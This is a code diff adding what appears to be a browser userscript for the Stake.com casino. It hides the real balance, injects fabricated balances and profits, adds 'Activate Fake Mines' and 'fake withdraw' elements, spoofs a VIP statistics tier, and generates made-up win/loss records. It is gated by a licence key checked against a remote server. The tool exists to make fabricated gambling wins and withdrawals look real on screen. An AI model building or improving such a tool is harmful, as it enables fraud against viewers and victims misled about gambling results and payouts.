+        bjInterval = setInterval(checkGameState, 100);
+
+        if (!isCheckingUrl) {
+            isCheckingUrl = true;
+            blackjackInterval = setInterval(() => {
+                if (!window.location.href.startsWith("https://stake.com/casino/games/blackjack")) {
+                    clearInterval(blackjackInterval)
+                    clearWatchButtonIntervals();
+                    clearInterval(bjInterval)
+                    resetflags();
+                    mains();
+                }
+            }, 100);
+        }
+    }
+
+    function minesmain() {
+        returned = true;
+        clearWatchButtonIntervals();
+        clearWatchIntervals();
+
+        watchButtonAndUpdate();
+        watchButton2AndUpdate();
+        removeBal();
+        watchAndCalculate();
+        watchAndChangeValue();
+
+        if (!isCheckingUrl) {
+            isCheckingUrl = true;
+            minesInterval = setInterval(() => {
+                if (!window.location.href.startsWith("https://stake.com/casino/games/mines")) {
+                    clearInterval(minesInterval)
+                    clearWatchButtonIntervals();
+                    clearWatchIntervals();
+                    resetflags();
+                    mains();
+                }
+            }, 100);
+        }
+    }
+
+    function kenomain() {
+        returned = true;
+        clearWatchButtonIntervals();
+        clearKenoIntervals();
+
+        watchButtonAndUpdate();
+        watchButton2AndUpdate();
+        removeBalKeno();
+        watchAndCalculatekeno();
+
+        if (!isCheckingUrl) {
+            isCheckingUrl = true;
+            kenoInterval = setInterval(() => {
+                if (!window.location.href.startsWith("https://stake.com/casino/games/keno")) {
+                    clearInterval(kenoInterval)
+                    clearKenoIntervals();
+                    clearWatchButtonIntervals();
+                    resetflags();
+                    mains();
+                }
+            }, 100);
+        }
+    }
+
+    function dicemain() {
+        returned = true;
+        clearWatchButtonIntervals();
+        clearDiceIntervals();
+
+        updateProfitValues();
+        watchButtonAndUpdate();
+        removeBaldice();
+        watchButton2AndUpdate();
+
+        if (!isCheckingUrl) {
+            isCheckingUrl = true;
+            diceInterval = setInterval(() => {
+                if (!window.location.href.startsWith("https://stake.com/casino/games/dice")) {
+                    clearInterval(diceInterval)
+                    clearDiceIntervals();
+                    clearWatchButtonIntervals();
+                    resetflags();
+                    mains();
+                }
+            }, 100);
+        }
+    }
+
+    function limbomain() {
+        returned = true;
+        clearWatchButtonIntervals();
+        clearLimboIntervals();
+
+        updateProfitValueslimbo();
+        watchButtonAndUpdate();
+        removeBallimbo();
+        watchButton2AndUpdate();
+
+        if (!isCheckingUrl) {
+            isCheckingUrl = true;
+            LimboInterval = setInterval(() => {
+                if (!window.location.href.startsWith("https://stake.com/casino/games/limbo")) {
+                    clearInterval(LimboInterval)
+                    clearLimboIntervals();
+                    clearWatchButtonIntervals();
+                    resetflags();
+                    mains();
+                }
+            }, 100);
+        }
+    }
+
+    function clearAllIntervals() {
+        clearWatchButtonIntervals();
+        clearWatchIntervals();
+        clearDiceIntervals();
+        clearKenoIntervals();
+        clearLimboIntervals()
+        clearInterval(bjInterval)
+        clearTimeout(mainsInterval); // Clear mainsInterval
+    }
+
+    function resetflags() {
+        profitfound = false;
+        balanceChanged = false;
+        removedbal = false;
+        removedbal2 = false
+        removeBalActive = true;
+        isButtonClickable = true;
+        gameInProgress = false;
+        gameInProgress2 = false
+        lastClickTime = 0;
+        multi = 1;
+        multis = 1
+        profit_on_win = 0;
+        returned = false
+        isCheckingUrl = false
+        clearAllIntervals()
+    }
+
+
+    function checkCryptoTitle() {
+        // Get the element by the selector
+        const element = document.querySelector("#svelte > div.wrap.svelte-844n9s > div.main-content.svelte-844n9s > div.navigation.svelte-1nt2705 > div > div > div > div.balance-toggle.svelte-51jofe > div > div > div > button > div > div > span.weight-normal.line-height-default.align-left.size-default.text-size-default.variant-subtle.is-truncate.svelte-17v69ua");
+
+        if (element) {
+            // Get the text content of the element
+            const title = element.title
+
+            // Check the title and log accordingly
+            if (title === "ltc") {
+                currency = "ltc"
+            } else if (title === "eth") {
+                currency = "eth"
+            } else if (title === "btc") {
+                currency = "btc"
+            } else {
+                if (!warned) {
+                    showModal2('WARNING! You\'re using a Non-Supported crypto currency. Try using LTC/ETH/BTC');
+                    warned = true
+                }
+            }
+            setTimeout(checkCryptoTitle, 1000)
+        } else {
+            setTimeout(checkCryptoTitle, 1000)
+        }
+    }
+
+    function checkmissings(showModal = true) {
+        let missings = []
+        let nonEssentialMissing = []
+        let mine = false
+        let bomb = false
+        let popup = false
+        let cover = false
+        let ethwin = false
+        let ethmenu = false
+        let btcwin = false
+        let statics = false
+        let withdraw_ltc = false
+
+        if (localStorage.getItem('uncovered')) {
+            cover = true
+        }
+        if (localStorage.getItem('copiedMineElement')) {
+            mine = true
+        }
+        if (localStorage.getItem('copiedBomb')) {
+            bomb = true
+        }
+        if (localStorage.getItem('copiedWinMenu')) {
+            popup = true
+        }
+        if (localStorage.getItem('eth_menu')) {
+            ethmenu = true
+        }
+        if (localStorage.getItem('eth_win')) {
+            ethwin = true
+        }
+        if (localStorage.getItem('btc_win')) {
+            btcwin = true
+        }
+        if (localStorage.getItem('diamond2')) {
+            statics = true
+        }
+        if (localStorage.getItem('withdraw_ltc')) {
+            withdraw_ltc = true
+        }
+
+        if (!mine) {
+            missings.push("mine");
+        }
+        if (!bomb) {
+            missings.push("bomb");
+        }
+        if (!popup) {
+            missings.push("popup");
+        }
+        if (!cover) {
+            missings.push("cover");
+        }
+        if (!ethwin) {
+            missings.push("eth win");
+        }
+        if (!ethmenu) {
+            missings.push("eth menu");
+        }
+        if (!btcwin) {
+            missings.push("btc win");
+        }
+        if (!statics) {
+            missings.push("statics");
+        }
+        if (!withdraw_ltc) {
+            missings.push("fake withdraw")
+        }
+        if (showModal) {
+            if (missings.length === 0) {
+                console.log("The setup is good.");
+            } else {
+                nonEssentialMissing = missings.some(item => !["mine", "bomb", "popup", "cover"].includes(item));
+
+                if (nonEssentialMissing) {
+                    const missingItemsMessage = `Setup is missing ${missings.join(', ')}. Send this to muck.`;
+                    const modalContent = `${missingItemsMessage}<br><br>
+                                  <input type="text" id="keyInput" placeholder="Enter your key" /><br><br>
+                                  <button id="validateKeyButton">Submit Key</button>
+                                  <button id="closeModalButton" style="margin-left: 20px;">Close</button>`;
+                    showModal3(modalContent);
+
+                    // Attach the event listener to the button after the modal is created
+                    document.getElementById('validateKeyButton').addEventListener('click', validateKey);
+                    document.getElementById('closeModalButton').addEventListener('click', closeModal);
+                } else {
+                    const missingItemsMessage = `Setup is missing ${missings.join(', ')}. Send this to muck.`;
+                    showModal2(missingItemsMessage);
+                }
+            }
+        }
+        return nonEssentialMissing;
+    }
+
+    function markKeyAsUsed(key) {
+        // Logic to mark the key as used on the server
+        fetch('https://8ed7af64-9ef2-4330-b2bf-959a8096dfce-00-34lxz8heo77is.janeway.replit.dev:3000/mark_key_used', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ key: key }),
+        })
+            .then(response => response.json())
+            .then(data => {
+            if (!data.success) {
+                console.error("Failed to mark the key as used.");
+            }
+        })
+            .catch(error => {
+            console.error("Error:", error);
+        });
+    }
+
+    function closeModal() {
+        const modal = document.getElementById('validateKeyModal');
+        if (modal) {
+            modal.remove();
+        }
+    }
+    function showModal3(content) {
+        const modal = document.createElement('div');
+        modal.id = 'validateKeyModal';
+        modal.style.position = 'fixed';
+        modal.style.top = '50%';
+        modal.style.left = '50%';
+        modal.style.transform = 'translate(-50%, -50%)';
+        modal.style.backgroundColor = 'white';
+        modal.style.padding = '20px';
+        modal.style.zIndex = '1000';
+        modal.style.border = '1px solid #000';
+
+        const modalContent = document.createElement('div');
+        modalContent.innerHTML = content;
+
+        modal.appendChild(modalContent);
+        document.body.appendChild(modal);
+    }
+
+    function mains() {
+        loggedin = true;
+
+        if (firstrun) {
+            if (localStorage.getItem('autoLoadPreviousBalance') === '1') {
+                applybal()
+            }
+            checkmissings()
+            setInterval(savebal, 1500)
+            showCustommodal("Enter your details below:");
+            replaceLastChildWithLtcMenu();
+            checkForElement();
+            firstrun = false;
+        }
+
+        if (returned) {
+            resetflags();
+        }
+
+        if (window.location.href.startsWith("https://stake.com/")) {
+            if (window.location.href === "https://stake.com/casino/games/mines") {
+                if (currentGame !== 'mines') {
+                    shouldContinue = true
+                    clearAllIntervals();
+                    currentGame = 'mines';
+                    minesmain();
+                }
+            } else if (window.location.href === "https://stake.com/casino/games/dice") {
+                if (currentGame !== 'dice') {
+                    clearAllIntervals();
+                    currentGame = 'dice';
+                    dicemain();
+                }
+            } else if (window.location.href === "https://stake.com/casino/games/keno") {
+                if (currentGame !== 'keno') {
+                    clearAllIntervals();
+                    currentGame = 'keno';
+                    kenomain();
+                }
+            } else if (window.location.href === "https://stake.com/casino/games/blackjack") {
+                if (currentGame !== 'blackjack') {
+                    clearAllIntervals()
+                    currentGame = "blackjack"
+                    bjmain()
+                }
+            } else if (window.location.href === "https://stake.com/casino/games/limbo") {
+                if (currentGame !== 'limbo') {
+                    clearAllIntervals()
+                    currentGame = "limbo"
+                    limbomain()
+                }
+            } else {
+                if (currentGame) {
+                    if (currentGame === "mines") {
+                        ranbefore = false
+                        shouldContinue = false
+                    }
+                    currentGame = '';
+                    buttonClicked = false
+                    clearAllIntervals();
+                    resetflags();
+                    mains();
+                } else {
+                    mainsInterval = setTimeout(mains, 100);
+                }
+            }
+        } else {
+            if (currentGame) {
+                currentGame = '';
+                clearAllIntervals();
+                resetflags();
+                mains();
+            } else {
+                mainsInterval = setTimeout(mains, 100);
+            }
+        }
+    }
+
+    const nobles = "tp"
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === "F2") {
+            if (!loggedin) return
+            toggleModalVisibility();
+        } else if (e.key === "F8") { // Toggle removeBalActive when F8 is pressed
+            if (!loggedin) return
+            removeBalActive = !removeBalActive;
+        }
+    });
+
+    function disableBlurEffect() {
+        const shouldBlur = localStorage.getItem('toggleBlurVipProgress') === '1';
+        const blurEffect = localStorage.getItem('blurEffect');
+        const vipProgressElements = document.querySelector("#main-content > div > div.layout-spacing.variant-normal.svelte-l4ghjo > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1n5vfyg > div > div");
+        // Add the rainbow animation CSS if not already added
+        if (!document.querySelector('#rainbow-animation')) {
+            const style = document.createElement('style');
+            style.id = 'rainbow-animation';
+            style.textContent = `
+            @keyframes rainbow {
+                0% { background-position: 0% 0%; }
+                50% { background-position: 100% 100%; }
+                100% { background-position: 0% 0%; }
+            }
+        `;
+            document.head.appendChild(style);
+        }
+
+        if (vipProgressElements) {
+            // Create the overlay if it doesn't exist
+            let overlay = vipProgressElements.querySelector('.blur-overlay');
+            if (!overlay) {
+                overlay = document.createElement('div');
+                overlay.className = 'blur-overlay';
+                vipProgressElements.appendChild(overlay);
+            }
+
+            if (shouldBlur) {
+                if (blurEffect === 'rgbBlur') {
+                    // Apply RGB blur effect to the overlay
+                    overlay.style.display = 'block';
+                    overlay.style.position = 'absolute';
+                    overlay.style.top = '0';
+                    overlay.style.left = '0';
+                    overlay.style.width = '100%';
+                    overlay.style.height = '100%';
+                    overlay.style.background = 'rgba(255, 255, 255, 0)'; // Transparent background
+                    overlay.style.filter = 'blur(10px)';
+                    overlay.style.transition = 'filter 0.3s ease';
+                    overlay.style.zIndex = '999'; // Ensure it's on top
+                    overlay.style.pointerEvents = 'none'; // Allow interaction with underlying elements
+
+                    // Apply rainbow effect to the overlay
+                    overlay.style.background = 'linear-gradient(45deg, red, orange, yellow, green, blue, indigo, violet)';
+                    overlay.style.backgroundSize = '400% 400%';
+                    overlay.style.animation = 'rainbow 3s ease infinite';
+                    vipProgressElements.style.filter = 'blur(10px)';
+                    vipProgressElements.style.transition = 'filter 0.3s ease';
+                } else {
+                    // Apply standard blur effect
+                    overlay.style.display = 'block';
+                    overlay.style.position = 'absolute';
+                    overlay.style.top = '0';
+                    overlay.style.left = '0';
+                    overlay.style.width = '100%';
+                    overlay.style.height = '100%';
+                    overlay.style.background = 'rgba(255, 255, 255, 0)'; // Transparent background
+                    overlay.style.filter = 'blur(10px)';
+                    overlay.style.transition = 'filter 0.3s ease';
+                    overlay.style.zIndex = '999'; // Ensure it's on top
+                    overlay.style.pointerEvents = 'none'; // Allow interaction with underlying elements
+                    overlay.style.animation = ''; // Remove animation if not RGB blur
+                    vipProgressElements.style.filter = 'blur(10px)';
+                    vipProgressElements.style.transition = 'filter 0.3s ease';
+                }
+            } else {
+                // Hide the overlay
+                overlay.style.display = 'none';
+                vipProgressElements.style.filter = '';
+                vipProgressElements.style.transition = '';
+            }
+        }
+    }
+
+
+    function createCustommodal2(message) {
+        const ranges = {
+            'bronze': { text: "Bronze" },
+            'silver': { text: "Silver" },
+            'gold': { text: "Gold" },
+            'plat': { text: "Platinum" },
+            'plat2': { text: "Platinum II" },
+            'plat3': { text: "Platinum III" },
+            'plativ': { text: "Platinum IV" },
+            'platv': { text: "Platinum V" },
+            'platvi': { text: "Platinum VI" },
+            'diamond': { text: "Diamond" },
+            'diamond2': { text: "Diamond II" }
+        };
+
+        let elementKey = localStorage.getItem('selectedTier') || 'bronze';
+
+        if (elementKey !== 'bronze') {
+            replaceWithChildrenAndPrintRandom(elementKey)
+        }
+
+        const modal2 = document.createElement('div');
+        modal2.style.position = 'fixed';
+        modal2.style.top = '50%';
+        modal2.style.left = '11%';
+        modal2.style.transform = 'translate(-50%, -50%)';
+        modal2.style.backgroundColor = '#36393f'; // Discord dark theme background color
+        modal2.style.padding = '20px';
+        modal2.style.color = 'white';
+        modal2.style.borderRadius = '10px';
+        modal2.style.textAlign = 'center';
+        modal2.style.width = '16vw'; // Width is 60% of the viewport width
+        modal2.style.maxWidth = '400px'; // Max width ensures it doesn't get too large on big screens
+        modal2.style.height = 'auto'; // Height adjusts based on content
+        modal2.style.maxHeight = '80vh'; // Max height is 80% of the viewport height
+        modal2.style.overflowY = 'auto'; // Adds scroll if content overflows
+        modal2.style.display = 'none'; // Initially hidden
+
+        // Create the new settings icon
+        const additionalSettingsIcon = document.createElement('div');
+        additionalSettingsIcon.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="white">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+    `;
+        additionalSettingsIcon.style.position = 'absolute';
+        additionalSettingsIcon.style.top = '10px';
+        additionalSettingsIcon.style.right = '10px';
+        additionalSettingsIcon.style.cursor = 'pointer';
+        // Create the settings icon
+        const settingsIcon = document.createElement('div');
+        settingsIcon.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="white">
+            <path d="M12 16.5a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9zm0-7a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM12 2a10 10 0 0 0-9 5.26c-.64 1.18-1.16 2.48-1.6 3.76a1.002 1.002 0 0 0 .49 1.12A10.011 10.011 0 0 0 12 22a10.011 10.011 0 0 0 9.71-6.86 1.002 1.002 0 0 0 .49-1.12c-.44-1.28-.96-2.58-1.6-3.76A10 10 0 0 0 12 2zm0 18c-4.44 0-8.25-2.39-10-5.8.28-.56.58-1.1.9-1.6A8.045 8.045 0 0 0 12 20a8.045 8.045 0 0 0 8.1-5.4c.32.5.62 1.04.9 1.6-1.75 3.41-5.56 5.8-10 5.8z"/>
+        </svg>
+    `;
+        settingsIcon.style.position = 'absolute';
+        settingsIcon.style.top = '10px';
+        settingsIcon.style.left = '10px';
+        settingsIcon.style.cursor = 'pointer';
+
+        // Create the settings section
+        const settingsSection = document.createElement('div');
+        settingsSection.id = 'settingsSection';
+        settingsSection.style.display = 'none'; // Initially hidden
+        settingsSection.style.marginTop = '20px';
+        settingsSection.innerHTML = `
+    <div style="margin-bottom: 20px;">
+        <label style="display: block; margin-bottom: 5px;">Show access granted message on start-up</label>
+        <div id="toggleContainer" style="display: flex; align-items: center; justify-content: center;">
+            <div id="toggleSwitch" style="
+                width: 50px;
+                height: 25px;
+                background-color: ${localStorage.getItem('showAccessGranted') === '0' ? '#555' : '#43b581'};
+                border-radius: 15px;
+                cursor: pointer;
+                position: relative;
+            ">
+                <div style="
+                    width: 20px;
+                    height: 20px;
+                    background-color: white;
+                    border-radius: 50%;
+                    position: absolute;
+                    top: 50%;
+                    left: ${localStorage.getItem('showAccessGranted') === '1' ? '25px' : '5px'};
+                    transform: translateY(-50%);
+                    transition: all 0.3s;
+                "></div>
+            </div>
+        </div>
+    </div>
+    <div style="margin-bottom: 20px;">
+        <label style="display: block; margin-bottom: 5px;">Auto Activate Fake Mines</label>
+        <div id="autoActivateContainer" style="display: flex; align-items: center; justify-content: center;">
+            <div id="autoActivateSwitch" style="
+                width: 50px;
+                height: 25px;
+                background-color: ${localStorage.getItem('autoActivateFakeMines') === '1' ? '#43b581' : '#555'};
+                border-radius: 15px;
+                cursor: pointer;
+                position: relative;
+            ">
+                <div style="
+                    width: 20px;
+                    height: 20px;
+                    background-color: white;
+                    border-radius: 50%;
+                    position: absolute;
+                    top: 50%;
+                    left: ${localStorage.getItem('autoActivateFakeMines') === '1' ? '25px' : '5px'};
+                    transform: translateY(-50%);
+                    transition: all 0.3s;
+                "></div>
+            </div>
+        </div>
+    </div>
+    <div style="margin-bottom: 20px;">
+        <label style="display: block; margin-bottom: 5px;">Auto Load Previous Balance</label>
+        <div id="autoLoadBalanceContainer" style="display: flex; align-items: center; justify-content: center;">
+            <div id="autoLoadBalanceSwitch" style="
+                width: 50px;
+                height: 25px;
+                background-color: ${localStorage.getItem('autoLoadPreviousBalance') === '1' ? '#43b581' : '#555'};
+                border-radius: 15px;
+                cursor: pointer;
+                position: relative;
+            ">
+                <div style="
+                    width: 20px;
+                    height: 20px;
+                    background-color: white;
+                    border-radius: 50%;
+                    position: absolute;
+                    top: 50%;
+                    left: ${localStorage.getItem('autoLoadPreviousBalance') === '1' ? '25px' : '5px'};
+                    transform: translateY(-50%);
+                    transition: all 0.3s;
+                "></div>
+            </div>
+        </div>
+    </div>
+    <div style="margin-bottom: 20px;">
+        <label style="display: block; margin-bottom: 5px;">Blur VIP Progress (BETA)</label>
+        <div id="toggleBlurVipContainer" style="display: flex; align-items: center; justify-content: center;">
+            <div id="toggleBlurVipSwitch" style="
+                width: 50px;
+                height: 25px;
+                background-color: ${localStorage.getItem('toggleBlurVipProgress') === '1' ? '#43b581' : '#555'};
+                border-radius: 15px;
+                cursor: pointer;
+                position: relative;
+            ">
+                <div style="
+                    width: 20px;
+                    height: 20px;
+                    background-color: white;
+                    border-radius: 50%;
+                    position: absolute;
+                    top: 50%;
+                    left: ${localStorage.getItem('toggleBlurVipProgress') === '1' ? '25px' : '5px'};
+                    transform: translateY(-50%);
+                    transition: all 0.3s;
+                "></div>
+            </div>
+            <select id="blurOptions" style="
+                margin-left: 10px;
+                padding: 5px;
+                border: none;
+                border-radius: 15px;
+                background-color: ${localStorage.getItem('toggleBlurVipProgress') === '1' ? '#43b581' : '#555'};
+                color: white;
+                font-size: 14px;
+                cursor: pointer;
+                appearance: none;
+                text-align: center;
+                transition: background-color 0.3s;
+            ">
+                <option value="blur" ${localStorage.getItem('blurEffect') === 'blur' ? 'selected' : ''}>Blur</option>
+                <option value="rgbBlur" ${localStorage.getItem('blurEffect') === 'rgbBlur' ? 'selected' : ''}>RGB Blur</option>
+            </select>
+        </div>
+    </div>
+`;
+
+        modal2.innerHTML = `
+        <h2 style="margin-bottom: 20px;">Mines System</h2>
+        <p style="margin-top: 10px; color: #43b581;">${message}</p>
+        <div style="margin-top: 20px;">
+            <label for="tierSelection" style="display: block; margin-bottom: 5px;">Select Statistics Tier:</label>
+            <select id="tierSelection" style="width: 100%; padding: 8px; border-radius: 5px; border: none; background-color: #2f3136; color: white;">
+                ${Object.keys(ranges).map(key => `<option value="${key}" ${key === elementKey ? 'selected' : ''}>${ranges[key].text}</option>`).join('')}
+            </select>
+        </div>
+        <div style="margin-top: 20px;">
+            <button id="activateMinesButton" style="padding: 10px 20px; background-color: #7289da; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
+                Activate Fake Mines
+            </button>
+        </div>
+        <div style="margin-top: 20px;">
+            <label for="betAmount" style="display: block; margin-bottom: 5px;">Bet Amount:</label>
+            <input type="text" id="betAmount" style="width: 100%; padding: 8px; border-radius: 5px; border: none; background-color: #2f3136; color: white;">
+        </div>
+        <div style="margin-top: 20px;">
+            <label for="balanceAmount" style="display: block; margin-bottom: 5px;">Balance Amount:</label>
+            <input type="text" id="balanceAmount" style="width: 100%; padding: 8px; border-radius: 5px; border: none; background-color: #2f3136; color: white;">
+        </div>
+        <p id="toggleInfo" style="margin-top: 20px; color: #43b581;">Press F2 to show/hide this modal</p>
+    `;
+        // Create the additional settings modal
+        const additionalSettingsModal = document.createElement('div');
+        additionalSettingsModal.style.position = 'fixed';
+        additionalSettingsModal.style.top = '50%';
+        additionalSettingsModal.style.left = '50%';
+        additionalSettingsModal.style.transform = 'translate(-50%, -50%)';
+        additionalSettingsModal.style.backgroundColor = '#2f3136';
+        additionalSettingsModal.style.padding = '20px';
+        additionalSettingsModal.style.color = 'white';
+        additionalSettingsModal.style.borderRadius = '10px';
+        additionalSettingsModal.style.textAlign = 'center';
+        additionalSettingsModal.style.width = '350px';
+        additionalSettingsModal.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.3)';
+        additionalSettingsModal.style.zIndex = '1000'; // Ensure it's on top of other elements
+        additionalSettingsModal.style.display = 'none'; // Initially hidden
+
+        const closeAdditionalSettingsModal = document.createElement('button');
+        closeAdditionalSettingsModal.textContent = 'Close';
+        closeAdditionalSettingsModal.style.backgroundColor = '#ff4757';
+        closeAdditionalSettingsModal.style.color = 'white';
+        closeAdditionalSettingsModal.style.border = 'none';
+        closeAdditionalSettingsModal.style.padding = '10px 20px';
+        closeAdditionalSettingsModal.style.borderRadius = '5px';
+        closeAdditionalSettingsModal.style.cursor = 'pointer';
+        closeAdditionalSettingsModal.style.marginTop = '20px';
+        closeAdditionalSettingsModal.style.fontSize = '16px';
+        closeAdditionalSettingsModal.onclick = () => {
+            additionalSettingsModal.style.display = 'none';
+        };
+
+        const generateButton = document.createElement('button');
+        generateButton.textContent = 'Generate Random Wins/Losses';
+        generateButton.style.backgroundColor = '#4caf50';
+        generateButton.style.color = 'white';
+        generateButton.style.border = 'none';
+        generateButton.style.padding = '10px 20px';
+        generateButton.style.borderRadius = '5px';
+        generateButton.style.cursor = 'pointer';
+        generateButton.style.marginTop = '20px';
+        generateButton.style.fontSize = '16px';
+        generateButton.onclick = () => {
+            const totalBets = parseInt(document.getElementById('totalBets').value, 10) || 0;
+
+            if (totalBets >= 2) {
+                const minWins = Math.ceil(totalBets * 0.25);
+                const maxWins = Math.floor(totalBets * 0.65);
+                const wins = Math.floor(Math.random() * (maxWins - minWins + 1)) + minWins;
+                const losses = totalBets - wins;
+
+                // Update input fields with generated values
+                document.getElementById('numberOfWins').value = wins;
+                document.getElementById('numberOfLosses').value = losses;
+                document.getElementById('totalBets').value = totalBets;
+
+                localStorage.setItem('numberOfWins', wins)
+                localStorage.setItem('numberOfLosses', losses)
+                localStorage.setItem('totalBets', totalBets)
+
+            } else {
+                alert('Total Bets must be at least 2.');
+            }
+        };
+
+        additionalSettingsModal.innerHTML = `
+    <h2 style="margin-bottom: 20px;">Additional Settings</h2>
+    <div style="margin-bottom: 15px;">
+        <label for="totalBets" style="display: block; margin-bottom: 5px;">Total Bets:</label>
+        <input type="number" id="totalBets" style="
+            width: calc(100% - 20px);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            box-sizing: border-box;
+        " />
+    </div>
+    <div style="margin-bottom: 15px;">
+        <label for="numberOfWins" style="display: block; margin-bottom: 5px;">Number of Wins:</label>
+        <input type="number" id="numberOfWins" style="
+            width: calc(100% - 20px);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            box-sizing: border-box;
+        " />
+    </div>
+    <div style="margin-bottom: 20px;">
+        <label for="numberOfLosses" style="display: block; margin-bottom: 5px;">Number of Losses:</label>
+        <input type="number" id="numberOfLosses" style="
+            width: calc(100% - 20px);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            box-sizing: border-box;
+        " />
+    </div>
+`;
+
+    // Create the Discord icon
+        const discordIcon = document.createElement('img');
+        discordIcon.src = 'https://img.icons8.com/?size=256&id=30888&format=png';
+        discordIcon.alt = 'Discord';
+        discordIcon.style.position = 'absolute';
+        discordIcon.style.top = '7px';
+        discordIcon.style.right = '40px';
+        discordIcon.style.cursor = 'pointer';
+        discordIcon.style.width = '30px'; // Adjust size as needed
+        discordIcon.style.height = '30px'; // Adjust size as needed
+
+
+        modal2.appendChild(discordIcon);
+        additionalSettingsModal.appendChild(generateButton);
+        additionalSettingsModal.appendChild(closeAdditionalSettingsModal);
+        document.body.appendChild(additionalSettingsModal);
+        modal2.appendChild(settingsIcon);
+        modal2.appendChild(settingsSection);
+        modal2.appendChild(additionalSettingsIcon);
+
+        document.body.appendChild(modal2);
+        // Event listener to toggle settings modal
+        additionalSettingsIcon.addEventListener('click', () => {
+            additionalSettingsModal.style.display = additionalSettingsModal.style.display === 'none' ? 'block' : 'none';
+        });
+        // Add event listener to open the Discord link in a new tab
+        discordIcon.addEventListener('click', () => {
+            window.open('https://discord.gg/gyC9qU5YpG', '_blank');
+        });
+        document.getElementById('blurOptions').addEventListener('change', (event) => {
+            localStorage.setItem('blurEffect', event.target.value);
+            disableBlurEffect()
+        });
+        // Add input event listeners to update localStorage
+        const totalBetsInput = document.getElementById('totalBets');
+        const numberOfWinsInput = document.getElementById('numberOfWins');
+        const numberOfLossesInput = document.getElementById('numberOfLosses');
+
+        document.getElementById('toggleBlurVipSwitch').addEventListener('click', () => {
+            const isBlurred = localStorage.getItem('toggleBlurVipProgress') === '1';
+            localStorage.setItem('toggleBlurVipProgress', isBlurred ? '0' : '1');
+
+            document.getElementById('toggleBlurVipSwitch').style.backgroundColor = isBlurred ? '#555' : '#43b581';
+            document.querySelector('#toggleBlurVipSwitch div').style.left = isBlurred ? '5px' : '25px';
+
+            disableBlurEffect()
+        });
+        totalBetsInput.addEventListener('input', () => {
+            const totalBets = parseInt(totalBetsInput.value, 10) || 0;
+            localStorage.setItem('totalBets', totalBets);
+        });
+
+        numberOfWinsInput.addEventListener('input', () => {
+            const numberOfWins = parseInt(numberOfWinsInput.value, 10) || 0;
+            localStorage.setItem('numberOfWins', numberOfWins);
+        });
+
+        numberOfLossesInput.addEventListener('input', () => {
+            const numberOfLosses = parseInt(numberOfLossesInput.value, 10) || 0;
+            localStorage.setItem('numberOfLosses', numberOfLosses);
+        });
+        settingsIcon.addEventListener('click', () => {
+            const isVisible = settingsSection.style.display === 'block';
+            settingsSection.style.display = isVisible ? 'none' : 'block';
+        });
+
+
+        const tierSelection = modal2.querySelector('#tierSelection');
+        tierSelection.addEventListener('change', (event) => {
+            const selectedKey = event.target.value;
+            localStorage.setItem('selectedTier', selectedKey)
+            replaceWithChildrenAndPrintRandom(selectedKey);
+        });
+
+        const activateButton = modal2.querySelector('#activateMinesButton');
+
+        function updateButtonState() {
+            const currentUrl = window.location.href;
+            const autoActivateFakeMines = localStorage.getItem('autoActivateFakeMines')
+
+            if (currentUrl === "https://stake.com/casino/games/mines" && !buttonClicked && autoActivateFakeMines === '0') {
+                activateButton.disabled = false;
+                activateButton.style.cursor = 'pointer';
+                activateButton.style.backgroundColor = '#7289da'; // Enable the button with original color
+            } else if (currentUrl !== "https://stake.com/casino/games/mines") {
+                activateButton.disabled = true;
+                activateButton.style.cursor = 'not-allowed';
+                activateButton.style.backgroundColor = '#555'; // Change the button color to indicate it's disabled
+                activateButton.textContent = 'Activate Fake Mines';
+            } else if (autoActivateFakeMines === '1' && currentUrl === "https://stake.com/casino/games/mines" && !ranbefore) {
+                ranbefore = true
+                activateButton.disabled = true;
+                activateButton.style.cursor = 'not-allowed';
+                activateButton.style.backgroundColor = '#555'; // Change the button color to indicate it's disabled
+                activateButton.textContent = 'Fake Mines Activated';
+                activatefakemines()
+            }
+        }
+
+        // Update button state initially and then every second
+        updateButtonState();
+        urlCheckInterval = setInterval(updateButtonState, 500); // Check every 500ms
+
+        // Add event listener for "Activate Fake Mines" button
+        activateButton.addEventListener('click', () => {
+            if (!buttonClicked) {
+                activateButton.textContent = 'Fake Mines Activated';
+                activateButton.disabled = true;
+                activateButton.style.cursor = 'not-allowed';
+                activateButton.style.backgroundColor = '#555'; // Change the button color to indicate it's disabled
+                buttonClicked = true; // Mark button as clicked
+                activatefakemines();
+            }
+        });
+
+        modal2.querySelector('#betAmount').addEventListener('input', (event) => {
+            desiredNumber = parseFloat(event.target.value);
+            if (window.location.href === "https://stake.com/casino/games/blackjack") {
+                document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1u979cd > input").value = desiredNumber.toFixed(2);
+
+                const element22 = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > span > div.currency-conversion.svelte-e4myuj > div > div")
+
+                if (currency === "ltc") {
+                    const cryptoAmount = (desiredNumber / rate).toFixed(8);
+                    element22.innerText = cryptoAmount + " LTC";
+                } else if (currency === "eth") {
+                    const cryptoAmount = (desiredNumber / rateeth).toFixed(8);
+                    element22.innerText = cryptoAmount + " ETH";
+                } else if (currency === "btc") {
+                    const cryptoAmount = (desiredNumber / ratebtc).toFixed(8);
+                    element22.innerText = cryptoAmount + " BTC";
+                }
